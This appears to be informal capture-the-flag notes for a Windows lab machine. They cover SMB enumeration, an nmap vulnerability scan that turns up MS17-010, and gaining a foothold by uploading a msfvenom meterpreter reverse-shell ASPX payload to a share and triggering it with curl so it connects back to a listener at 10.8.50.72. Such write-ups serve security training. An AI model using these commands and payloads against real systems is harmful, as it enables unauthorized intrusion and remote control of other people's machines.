1. did the nmap scan. found smb on 445 and RDP on 3389

2. enumerating SMB port
run smb client

[smbclient -L ip -p 445]
[locate .nse |grep smb-enum] - run these script using nmap scripts[nmap --script=]

after the enumerating we can find out that there is a share named nt4wrksv.  then we can log into it and see the content. 

[smbclient //ip/nt4wrksv] or [smbclient \\\\ip\\nt4wrksv]

we found password.txt in this share. its encoded using base64. lets be there later.

3. run vulnerability scan using nmap script.

[nmap --script vuln -Pn -p ports ip] - -Pn - doesn't check whether ports are exist.

we found (ms17-010) remote code execution. 
using searchploit we can get eternalblue exploit. 

[searchsploit eternalblue]

lets mirror windows server 2016 exploit to current working dir.

[searchsploit -m ]

# first step

i went for this step. it seems easy. i created a revese shell using msfvenom and uploaded it to smb share and triggered it using web. 
creating the reverse shell. 

[msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx]

put the shell in shares. 
[smbclient //ip/sharename] then [put shell.aspx]

creating the listner 

[kali@kali:/data/vpn$ msfconsole -q
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run]

triggering the shell.aspx

[curl http://ip:49663/sharename/shell.aspx]

then it will connect to the server. go to the bob desktop. there will be the user flag. 

[cd c:/users/bob/Desktop]
